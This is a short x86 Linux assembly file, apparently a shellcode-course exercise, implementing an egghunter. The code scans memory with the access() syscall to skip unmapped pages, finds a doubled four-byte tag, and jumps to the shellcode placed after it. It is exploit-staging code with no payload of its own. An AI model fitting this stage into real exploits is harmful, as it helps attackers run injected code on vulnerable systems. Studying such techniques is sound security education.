; Author:   SLAE-755
;

global _start			

section .text

_start:

	xor ecx, ecx
	mul ecx

next_page:
	or dx, 0xfff

next_addr:
	; EDX is 4096 here, that is the value of PAGE_SIZE constant
	inc edx

	; EBX is our memory cursor
	lea ebx, [edx+0x4]

	xor eax, eax

	; access is defined as #define __NR_acces 33 in 
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is: 
	; int access(const char *pathname, int mode);

	mov al, 0x21
	int 0x80

	cmp al, 0xf2		; 0xf2 is the opcode for EFAULT. If my register
				; has this value, a signal for a invalid page
				; access it has been received
	jz next_page

	mov eax, key
	mov edi, edx
	scasd

	jnz next_addr
 
	scasd
	jnz next_addr

	; At this point we are at the very beginning of our shellcode, after
	; the second key. We can jump to it
	jmp edi

section .data
	key equ 0x50905090
